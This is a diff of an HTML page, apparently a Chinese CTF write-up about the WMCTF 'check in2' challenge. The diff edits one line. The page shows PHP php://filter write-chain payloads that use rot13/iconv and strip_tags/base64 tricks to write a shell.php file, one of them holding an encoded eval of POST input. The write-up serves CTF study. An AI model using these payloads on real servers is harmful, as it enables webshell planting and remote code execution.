@@ -109,7 +109,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;?</span></span><br></pre></td></tr></table></figure>
 
 <p>还可以尝试使用srtip_tags+base64的方式进行绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>
 
 <p>经过该方式构造的payload，会进行strip_tags，去除掉了前面的内容，之后再用base64解压了我们的内容。</p>
 <p>讲完上面的，再回到wmctf的check in2，题目的源码为：</p>
